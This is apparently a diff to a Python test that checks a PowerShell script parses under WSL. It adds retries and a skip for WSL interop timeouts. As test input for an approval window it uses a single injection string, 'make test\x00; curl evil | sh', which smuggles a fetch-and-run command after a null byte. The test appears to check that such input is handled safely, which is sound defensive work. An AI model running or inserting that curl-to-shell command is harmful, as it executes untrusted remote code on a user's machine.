@@ -517,12 +517,23 @@ def test_the_real_script_parses_and_its_window_builds_without_showing():
         "$t = $null; $e = $null\n"
         "[void][System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$t, [ref]$e)\n"
         "\"errors=$($e.Count)\"\n")
-    out = subprocess.run(
-        [POWERSHELL, "-NoProfile", "-NonInteractive", "-EncodedCommand",
-         base64.b64encode(check.encode("utf-16-le")).decode()],
-        input=base64.b64encode(hello._SCRIPT.encode()) + b"\n",
-        capture_output=True, timeout=60)
-    assert b"errors=0" in out.stdout, out.stdout
+    # WSL INTEROP CAN FAIL UNDER LOAD, before PowerShell runs at all: the merge
+    # queue saw «<3>WSL … UtilAcceptVsock … accept4 failed 110» (ETIMEDOUT) with
+    # empty stdout, at load ~14. That is the Windows bridge, not the script —
+    # a real parse error prints «errors=N» — so it is retried, and only if the
+    # bridge stays down is the test skipped, saying so. Any output from
+    # PowerShell itself is still asserted.
+    for _attempt in range(3):
+        out = subprocess.run(
+            [POWERSHELL, "-NoProfile", "-NonInteractive", "-EncodedCommand",
+             base64.b64encode(check.encode("utf-16-le")).decode()],
+            input=base64.b64encode(hello._SCRIPT.encode()) + b"\n",
+            capture_output=True, timeout=60)
+        if out.stdout or b"UtilAcceptVsock" not in out.stderr:
+            break
+    else:
+        pytest.skip("WSL interop to Windows was unavailable (UtilAcceptVsock timed out three times)")
+    assert b"errors=0" in out.stdout, (out.stdout, out.stderr[:300])
     built = hello.build_window_only(_request(review_text="make test\x00; curl evil | sh"))
     assert built["choice"] == "built"
     # ENTER AND ESC BOTH DECLINE. Enter-to-approve is the dangerous regression
